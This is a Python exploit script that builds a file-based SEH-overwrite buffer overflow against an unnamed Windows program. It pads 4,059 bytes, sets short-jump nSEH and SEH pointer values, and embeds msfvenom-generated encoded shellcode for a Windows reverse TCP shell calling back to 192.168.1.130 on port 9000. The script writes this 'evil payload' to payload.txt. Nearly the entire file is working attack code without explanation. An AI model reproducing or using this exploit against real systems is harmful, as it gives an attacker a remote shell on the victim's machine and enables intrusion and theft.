#!/usr/bin/python

import struct

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.130 LPORT=9000 -e x86/alpha_mixed -f py -b "\x00\x89" EXITFUNC=thread

buf =  b""
buf += b"\x54\x5f\xdd\xc1\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += b"\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += b"\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += b"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += b"\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x39\x78\x6c\x42"
buf += b"\x45\x50\x35\x50\x73\x30\x43\x50\x6b\x39\x4d\x35\x66"
buf += b"\x51\x6f\x30\x45\x34\x4e\x6b\x32\x70\x56\x50\x6e\x6b"
buf += b"\x43\x62\x36\x6c\x4e\x6b\x51\x42\x56\x74\x4c\x4b\x30"
buf += b"\x72\x61\x38\x74\x4f\x4e\x57\x63\x7a\x46\x46\x55\x61"
buf += b"\x59\x6f\x4e\x4c\x65\x6c\x75\x31\x71\x6c\x64\x42\x34"
buf += b"\x6c\x37\x50\x7a\x61\x6a\x6f\x76\x6d\x65\x51\x6b\x77"
buf += b"\x5a\x42\x4c\x32\x76\x32\x33\x67\x4e\x6b\x53\x62\x36"
buf += b"\x70\x4c\x4b\x62\x6a\x45\x6c\x6c\x4b\x32\x6c\x64\x51"
buf += b"\x71\x68\x38\x63\x57\x38\x57\x71\x38\x51\x50\x51\x6e"
buf += b"\x6b\x62\x79\x51\x30\x37\x71\x5a\x73\x4e\x6b\x37\x39"
buf += b"\x42\x38\x5a\x43\x36\x5a\x33\x79\x6e\x6b\x65\x64\x4e"
buf += b"\x6b\x67\x71\x5a\x76\x34\x71\x69\x6f\x4c\x6c\x4a\x61"
buf += b"\x4a\x6f\x34\x4d\x66\x61\x39\x57\x35\x68\x79\x70\x61"
buf += b"\x65\x39\x66\x66\x63\x51\x6d\x7a\x58\x35\x6b\x71\x6d"
buf += b"\x35\x74\x52\x55\x69\x74\x70\x58\x4e\x6b\x73\x68\x64"
buf += b"\x64\x76\x61\x78\x53\x35\x36\x6e\x6b\x74\x4c\x52\x6b"
buf += b"\x4e\x6b\x66\x38\x75\x4c\x47\x71\x69\x43\x6e\x6b\x33"
buf += b"\x34\x6e\x6b\x46\x61\x4e\x30\x4b\x39\x30\x44\x35\x74"
buf += b"\x67\x54\x51\x4b\x73\x6b\x50\x61\x51\x49\x72\x7a\x53"
buf += b"\x61\x49\x6f\x79\x70\x31\x4f\x71\x4f\x61\x4a\x6c\x4b"
buf += b"\x57\x62\x5a\x4b\x4c\x4d\x53\x6d\x35\x38\x65\x63\x34"
buf += b"\x72\x63\x30\x47\x70\x53\x58\x54\x37\x51\x63\x64\x72"
buf += b"\x43\x6f\x50\x54\x31\x78\x72\x6c\x53\x47\x46\x46\x66"
buf += b"\x67\x4b\x4f\x38\x55\x58\x38\x7a\x30\x77\x71\x75\x50"
buf += b"\x73\x30\x47\x59\x39\x54\x50\x54\x30\x50\x42\x48\x65"
buf += b"\x79\x4b\x30\x50\x6b\x45\x50\x69\x6f\x68\x55\x76\x30"
buf += b"\x56\x30\x62\x70\x36\x30\x63\x70\x56\x30\x61\x50\x76"
buf += b"\x30\x35\x38\x58\x6a\x74\x4f\x79\x4f\x79\x70\x4b\x4f"
buf += b"\x39\x45\x4e\x77\x70\x6a\x75\x55\x50\x68\x6f\x30\x4d"
buf += b"\x78\x47\x71\x6e\x62\x35\x38\x66\x62\x53\x30\x74\x63"
buf += b"\x67\x58\x4e\x69\x4b\x56\x50\x6a\x74\x50\x53\x66\x36"
buf += b"\x37\x55\x38\x4a\x39\x59\x35\x74\x34\x55\x31\x39\x6f"
buf += b"\x59\x45\x6f\x75\x4f\x30\x43\x44\x44\x4c\x79\x6f\x50"
buf += b"\x4e\x47\x78\x31\x65\x7a\x4c\x61\x78\x6c\x30\x6d\x65"
buf += b"\x6e\x42\x52\x76\x59\x6f\x59\x45\x32\x48\x71\x73\x62"
buf += b"\x4d\x31\x74\x73\x30\x4c\x49\x6a\x43\x70\x57\x73\x67"
buf += b"\x53\x67\x56\x51\x78\x76\x30\x6a\x72\x32\x36\x39\x63"
buf += b"\x66\x6b\x52\x79\x6d\x72\x46\x69\x57\x73\x74\x71\x34"
buf += b"\x75\x6c\x43\x31\x46\x61\x6c\x4d\x72\x64\x56\x44\x32"
buf += b"\x30\x7a\x66\x57\x70\x30\x44\x43\x64\x76\x30\x46\x36"
buf += b"\x36\x36\x31\x46\x53\x76\x71\x46\x62\x6e\x51\x46\x52"
buf += b"\x76\x46\x33\x42\x76\x51\x78\x31\x69\x38\x4c\x35\x6f"
buf += b"\x6d\x56\x4b\x4f\x4a\x75\x4e\x69\x49\x70\x32\x6e\x30"
buf += b"\x56\x30\x46\x6b\x4f\x30\x30\x55\x38\x37\x78\x4f\x77"
buf += b"\x77\x6d\x45\x30\x4b\x4f\x69\x45\x4f\x4b\x59\x70\x65"
buf += b"\x4d\x75\x7a\x67\x7a\x31\x78\x59\x36\x4a\x35\x4f\x4d"
buf += b"\x4d\x4d\x49\x6f\x4e\x35\x75\x6c\x34\x46\x43\x4c\x64"
buf += b"\x4a\x6f\x70\x69\x6b\x39\x70\x71\x65\x63\x35\x6d\x6b"
buf += b"\x43\x77\x55\x43\x64\x32\x32\x4f\x50\x6a\x75\x50\x62"
buf += b"\x73\x69\x6f\x7a\x75\x41\x41"

nseh = struct.pack("<I", 0x909006EB)
seh = struct.pack("<I", 0x1002324C)
payload = "A" * 4059 + nseh + seh + buf + "\xff" * 200

try:
    f=open("payload.txt","w")
    print("[+] Creating %s bytes evil payload." %len(payload))
    f.write(payload)
    f.close()
    print("[+] File created!")
except:
    print("File cannot be created.")
